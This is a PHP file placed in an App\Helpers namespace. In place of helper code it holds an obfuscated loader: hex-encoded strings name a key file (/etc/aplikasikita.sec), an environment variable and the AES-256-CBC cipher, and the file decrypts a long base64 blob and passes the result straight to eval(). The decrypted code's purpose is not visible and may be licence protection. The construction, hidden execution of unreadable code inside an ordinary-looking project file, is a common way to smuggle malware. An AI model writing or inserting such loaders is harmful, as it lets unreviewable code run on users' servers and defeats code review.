<?php
namespace App\Helpers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('wVIHev55FNkQLXab7d2Yew==');

$c=base64_decode(

'3YWVMh/B1Smeu1B3LA0a2VsFkCLItDqDb/pAkj6kI3r7IqPNyjH3j5RN3ZXAG04q1CzkIFsUsqZx' .
'5neW/5CBYYmWM8CB9NaK8mAQwMclJL5PHeK0Tm8Mn1Po+WXFafyUDqT63XSgYmsG1HJJ537Sp4ih' .
'GeQJrJzfxjGK7fK1sVXJ5YH76yrA7IwQcr5elfluqLZqKk9VWuBMImFolAci8lg//pCZBf3DbY2D' .
'//hjyGUvkb35RjZSac4XWrz8WY9NeZm2sdMvQWhNapRHtGUaxwmdpDfHfexsyrEPhenMFYLWKD5v' .
'S5R1QPrGfP905jnO+wwu2OuB9fXdVz4Fb7qFMtofnb10EAkTXUynRg2R4pUL6DdRKfsB+4aq33ol' .
'Fqr7yA+FNqtSisLAnQzVLc2RlhDJrSRV5ziGqT5txHF0dko7d+NV98hZFW3C/px4BfbAydS9G8VR' .
'39GAgSzMCR1CC8LrnzEaBYyvgMB10lXomY8GdVjJ8nScLK8kZkF8likHS1jtSZj8CRUsgiMzSdXl' .
'kIqnYpE/+gGUZ4ICWqbZy1W7wc2xvzX0F5KoKSftxzGP2qq5rYU4E2vIsxT9dL7H7VW3fGpUe8Bu' .
'I09berReyto6q6a6y2Z3A/3+Ujr5+1bu3NNJ+LOaR+vG+kOM6nEPN44rY3xmmxOyzPPPZnYZhxoW' .
'2jvPCNH4TZED/CJbli7ivKvGIsb173MnZykz75W5XUHd1wkOxRSlKBVh0UAFbfqCgs2C4v7Geo0W' .
'dT3caIolQnjST2EtfwZVr3dJEquSiDS9l8LwMdRNzSElxJOAGWPwu8eV95MbV66cKiUKVYKKiyRU' .
'IgmoP4HNkNSgyGkSRYDmp2QPxrCguQvZ+fl56xMIpTn74hIqd7Bm6wOqnkle0PAPERtmTCDozm/z' .
'3qZvcj2XlsxWdaGhksOeyR6CQ3vVevRO1QCFGFHW2Tvr9wDdDPatQoC1SGBcExGJGld50diESIw6' .
'MxO0UTriImlBfS7G/THWb2WvWo5G0TT5MAaZiFUl5ZGdrGwxmFBjsyFXt99XcrKjHGpcgObpC3XN' .
'EZTvC+/Imp2djNWaE8qPjJPIJbuVtbasILT8VCMWddieqahSSnODmL6nll2iFCtp3L6lkEW34jbL' .
'QFzl7ZLVDJyqo6nE+Un34JlkvXDIRFuFAXx4KPuV91OknCK5XLjXsosQjfw81/ojoyOa8U52qeUZ' .
'soFALCRcaoauAvYEaicdToYxgezZrsrKX+gnZp/EJYBoPpusWcw3LfTxBR3PfHeIfElWqq2X9E/w' .
'a74fl/y4YfUytqUN9aDJB+0Z82mJPVebfZXp1Ns8JVABSbcWXilYpSP7i498MpYuhB1mBNh8xf2N' .
'MbkT+trcLwCoRt74RFCUp/sBJ1WWKbfhqkzuZ5SClYrn8Hwm9meKUE0uEKBKqb4HA1KuLjv46rOC' .
'FL+Jvf+cE3X3XeHQAgPd6BRwewhZJYLurXg82gb6nEjP7wh4WbOEb5/b3zVCqmeqn4oyclPqvAcp' .
'dfrdy4SAqYBs1UnXKKOXVjoYV/pellUcfxky+zg0Z8Md09mRS9fVsjNNZGKaloHcF7lvbkVs/DX/' .
'8fu6CNjwozJuQ9oVafeV3e2XqFphI4IWdMJc62FUe3+8iDzGuw7YhCHoSO/4Eyj/uvJtBLAo7z7I' .
'J3QleT3CfvGIht/K1AcsWpGLPFIBnJnTgePoi1VrOOLdywjEfG0Wrjf5xWl5pOqRMbolVVreRGws' .
'LYrYwJpv9n1gy+bTnZhH1Qnky7SlZOIJLpT6M08/BBX11TYVi9/wsInXq9O9odXhlzK2O5BjPspg' .
'SJHaWVtCRBdGwP3+EcdBnEDkBjzIUV7GRCtr6F6KeJI2a+KBFnstaJN2JKvzE6puTjdxS4MTAhbE' .
'tk2Yl88UGdvk/HsLCqlCfk6fgtw18FXvI9twYQjebJhmRvUfZ6tI8vrQkm62+n3Q0bCSEzvI6BCU' .
'AkPWa97AzJyduB7bl/S2ixTx1SK5Hkotl33SZ3mNdwF4xCCet59fba3MIAE51Si8gmKG89/1LBIt' .
'AQeH54R2mB7E+LCPocc9dJLncNmdEjgfiAW6nEpvZEw8lLx/XlLP2JGr1EvYTh1BJ34n4GTdnqbW' .
'30jWaQOuJgfGyUOhlbwcS/tzbCScCbTWQvyllWakmqfxUPsx'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

